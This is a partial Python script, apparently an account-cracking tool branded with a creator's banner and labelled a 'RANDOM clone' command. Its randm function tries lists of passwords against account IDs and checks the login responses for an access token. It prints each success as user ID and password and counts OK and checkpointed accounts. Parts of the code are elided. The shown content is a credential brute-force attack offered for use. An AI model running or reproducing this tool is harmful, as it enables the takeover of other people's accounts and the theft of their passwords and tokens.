...
{A}──────────────────────────────────────────────────
╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗            ╠══[༄✺𓆩๛⃝CREATOR              • 𓆩๛⃝MEHEDI                                                                               ╠══[༄✺𓆩๛⃝MY𓆩๛⃝GITHUB           • 𓆩๛⃝MEHEDI-404                                                                           ╠══[༄✺𓆩๛⃝CONTACT              •𓆩๛⃝01*******06                                                                           ╠══[༄✺𓆩๛⃝CAMAND               • 𓆩๛⃝RANDOM 𓆩๛⃝clone
╠══[༄✺𓆩๛⃝VERSION              • 𓆩๛⃝1.0
╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝
{A}──────────────────────────────────────────────────"""
...
def randm(ids,psd):
    global loop,ok,cp
    sys.stdout.write(f"\r{G1}[{A}Mehedi Hasan {G1}]{A}-{G1}[{A}{loop}{G1}]{A}-{G1}[{A}OK{G1}/{A}CP{G1}]{A}-{G1}[{A}{len(ok)}{G1}/{A}{len(cp)}{G1}] ")
    sys.stdout.flush()
    try:
        for pas in psd:
            data={'adid':str(uuid.uuid4()),
            ...
            if 'access_token' in q:
                ...
                print(f'\r\r{G1}[Mehedi-OK] {uid} | {pas}')
